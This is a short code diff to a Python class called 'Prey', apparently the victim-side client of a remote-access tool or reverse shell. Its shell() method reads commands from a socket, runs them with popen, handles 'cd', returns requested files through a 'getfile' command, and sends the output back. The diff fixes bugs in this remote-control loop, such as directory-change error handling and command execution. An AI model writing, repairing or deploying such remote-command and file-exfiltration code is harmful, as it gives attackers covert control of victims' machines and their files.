@@ -11,17 +11,22 @@ class Prey:
 	def shell(self):
 		cmd = ""
 		while cmd != "exit":
-			self.sendmsj(getcwd())
+			self.sendmsj(str(getcwd()))
 			cmd = self.sock.recv(1024)
 			cmd = self.decodecmd(cmd)
 			cmd = cmd.lower()
 			if cmd[:2] == "cd":
-				chdir(flags)
+				try:
+					chdir(cmd[3:])
+				except FileNotFoundError:
+					self.sendmsj("Dir not found.")
 			elif cmd[:6] == "getfile":
 				self.sendfile(cmd[7:])
 			else: 
-				out = popen("{} {}".format(cmd, flags)).read()
-				self.sock.send(out.encode())
+				out = popen(cmd)
+				o = out.read()
+				print(o)
+				self.sendmsj(o)
 
 	def sendmsj(self, msj):
 		if not type(b"") == type(msj):
